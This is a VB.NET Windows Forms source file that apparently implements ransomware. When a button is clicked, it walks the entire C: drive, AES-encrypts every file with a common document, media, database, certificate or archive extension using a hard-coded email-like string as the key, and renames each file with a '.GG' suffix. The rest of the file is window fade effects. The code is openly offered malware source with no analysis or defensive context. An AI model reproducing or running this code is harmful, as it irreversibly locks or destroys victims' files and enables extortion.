Imports System.IO
Imports System.Security.Cryptography
Imports System.Text

Public Class Form1
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Call fil()
    End Sub

    Private Sub fil()
        Dim extensions As IEnumerable(Of String) = {".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep", ".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx", ".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw", ".cs", ".csv", ".db", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx", ".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla", ".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java", ".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef", ".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b", ".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot", ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar", ".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2", ".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma", ".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"}
        Dim drive As String = "C:\"

        For Each archive As String In Archives(drive, extensions)
            doit(archive, "bhklyt@gmail(dot)com")
        Next
    End Sub

    Public Shared Sub doit(nombre As String, password As String)
        Dim key As Byte() = New Byte(31) {}
        Encoding.Default.GetBytes(password).CopyTo(key, 0)
        Dim aes As New RijndaelManaged() With
            {
                .Mode = CipherMode.CBC,
                .KeySize = 256,
                .BlockSize = 256,
                .Padding = PaddingMode.Zeros
            }
        Dim buffer As Byte() = File.ReadAllBytes(nombre)
        Using matrizStream As New MemoryStream
            Using cStream As New CryptoStream(matrizStream, aes.CreateEncryptor(key, key), CryptoStreamMode.Write)
                cStream.Write(buffer, 0, buffer.Length)
                Dim appendBuffer As Byte() = matrizStream.ToArray()
                Dim finalBuffer As Byte() = New Byte(appendBuffer.Length - 1) {}
                appendBuffer.CopyTo(finalBuffer, 0)
                File.WriteAllBytes(nombre, finalBuffer)

            End Using
        End Using
        File.Move(nombre, nombre & ".GG")
    End Sub

    Public Shared Function Archives(drive As String, extensions As IEnumerable(Of String)) As IEnumerable(Of String)
        Return (From archive In IO.Directory.GetFiles(drive, "*", IO.SearchOption.AllDirectories) Where extensions.Contains(IO.Path.GetExtension(archive).ToLower())).ToList()
    End Function

    Private Sub Form1_DoubleClick(sender As Object, e As EventArgs) Handles MyBase.DoubleClick
        If Me.WindowState = FormWindowState.Normal Then
            Me.WindowState = FormWindowState.Maximized
        Else
            Me.WindowState = FormWindowState.Normal
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        fadeout()
        Application.Exit()
    End Sub

    Sub fadein()
        For fadeinside = 0.0 To 1.1 Step 0.1
            Me.Opacity = fadeinside
            Me.Refresh()
            Threading.Thread.Sleep(1)
        Next
    End Sub

    Sub fadeout()
        For fadeoutside = 90 To 10 Step -10
            Me.Opacity = fadeoutside / 100
            Me.Refresh()
            Threading.Thread.Sleep(1)
        Next
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Opacity = 0
        fadein()
    End Sub
End Class
